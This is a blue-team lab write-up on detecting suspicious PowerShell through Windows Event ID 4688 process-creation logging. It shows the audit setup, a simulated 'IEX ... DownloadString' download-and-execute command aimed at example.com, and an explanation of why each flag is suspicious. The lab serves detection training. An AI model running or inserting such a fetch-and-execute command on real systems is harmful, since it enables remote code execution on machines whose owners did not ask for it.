# 🔵 Blue Team Lab: Detecting Suspicious PowerShell Activity (Event ID 4688)

---

## 🎯 Objective

The goal of this lab was to simulate suspicious PowerShell activity and detect it using Windows Event Logs. This helps demonstrate how attackers abuse PowerShell and how defenders can identify malicious behaviour.

---

## 🧠 Background (Simple Explanation)

PowerShell is a powerful Windows tool used for automation and administration.

However, attackers often abuse PowerShell to:
- Download malware
- Execute malicious scripts
- Bypass security controls

As a blue team analyst, it is important to detect **suspicious PowerShell usage**, even if the attack fails.

---

## ⚙️ Lab Setup

### Step 1: Enable Process Creation Logging

Run PowerShell as Administrator and execute:

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable
```

---

### Step 2: Enable Command Line Logging

```powershell
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
```

This ensures full command-line activity is logged.

---

## 🧪 Step 3: Simulate Suspicious Activity

The following command was executed:

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
```

---

## ⚠️ What Happened

The command resulted in an error:

- The URL (`example.com`) returned HTML instead of a PowerShell script
- PowerShell attempted to execute it anyway
- This caused a **ParserError**

---

## 🧠 Key Learning

Even though the command failed, it still represents **suspicious behaviour**.

In real-world scenarios:
- Attackers may use broken or blocked URLs
- The attack may fail
- BUT the attempt is still logged and detectable

---

## 🔍 Step 4: Investigating in Event Viewer

Navigate to:

```
Event Viewer → Windows Logs → Security
```

Filter for:

```
Event ID: 4688
```

---

## 📸 Evidence Collected

### 1. PowerShell Execution Detected

The following process was identified:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

---

### 2. Suspicious Command Line

```
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
```

---

## 🚨 Why This Is Suspicious

### ❗ ExecutionPolicy Bypass
- Overrides PowerShell security restrictions
- Commonly used by attackers

---

### ❗ NoProfile
- Prevents loading user configurations
- Helps attackers stay stealthy

---

### ❗ IEX (Invoke-Expression)
- Executes text as code
- Frequently used in malware

---

### ❗ DownloadString
- Downloads content from the internet
- Often used to fetch malicious payloads

---

## 🧠 Analyst Conclusion

PowerShell was executed with multiple suspicious flags, including ExecutionPolicy Bypass and NoProfile. The command attempted to download and execute remote content using IEX, which is a strong indicator of malicious behaviour.

Although the command failed due to invalid content, the activity demonstrates how attackers attempt to execute remote code and how such behaviour can be detected through Windows Event Logs.

---

## 🧱 Skills Demonstrated

- Log analysis using Event Viewer
- Understanding Event ID 4688 (Process Creation)
- Identifying suspicious PowerShell usage
- Interpreting command-line arguments
- Recognising attacker techniques

---

## 🚀 Key Takeaway

Even failed attacks can reveal malicious intent.

Monitoring process creation logs and command-line activity is critical for detecting PowerShell-based attacks.

---


---
